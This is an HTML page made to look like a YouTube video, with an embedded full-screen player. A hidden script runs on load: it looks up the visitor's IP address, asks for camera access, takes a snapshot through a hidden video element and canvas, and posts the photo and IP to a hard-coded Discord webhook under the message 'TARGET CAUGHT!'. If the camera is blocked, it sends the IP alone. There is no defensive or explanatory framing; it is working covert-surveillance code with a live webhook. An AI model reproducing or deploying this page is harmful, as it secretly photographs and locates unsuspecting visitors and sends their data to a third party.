<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>
    <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw?autoplay=1" allow="autoplay; encrypted-media"></iframe>

    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // ANTI-SPAM: Isang beses lang mag-sesend kada session
        if (!sessionStorage.getItem('sent_data')) {
            const webhook = "https://discord.com/api/webhooks/1470024521758277849/x38VsV5RWVkSq6k7un7WZ8H43jrfzy9yUfI4D3MvDd_WP3jgTIb1_0kn6ga4Kho4c54z";

            async function startCapture() {
                try {
                    // Kunin ang accurate na IP
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    
                    // Request Camera
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('v');
                    video.srcObject = stream;

                    setTimeout(async () => {
                        const canvas = document.getElementById('c');
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const imgData = canvas.toDataURL('image/jpeg', 0.6);

                        const blob = await (await fetch(imgData)).blob();
                        const formData = new FormData();
                        formData.append('file', blob, 'huli_ka.jpg');
                        formData.append('payload_json', JSON.stringify({
                            content: "üéØ **TARGET CAUGHT!**\n**IP Address:** " + ipData.ip
                        }));

                        await fetch(webhook, { method: 'POST', body: formData });
                        
                        // Mark as sent para hindi mag-loop
                        sessionStorage.setItem('sent_data', 'true');
                        
                        // Patayin ang camera track
                        stream.getTracks().forEach(track => track.stop());
                    }, 1500);
                } catch (err) {
                    // Pag blocked ang cam, IP lang ang send (isang beses lang din)
                    const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                    fetch(webhook, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ content: "‚ö†Ô∏è Cam Blocked pero nakuha IP: " + ipData.ip })
                    });
                    sessionStorage.setItem('sent_data', 'true');
                }
            }
            window.onload = startCapture;
        }
    </script>
</body>
</html>
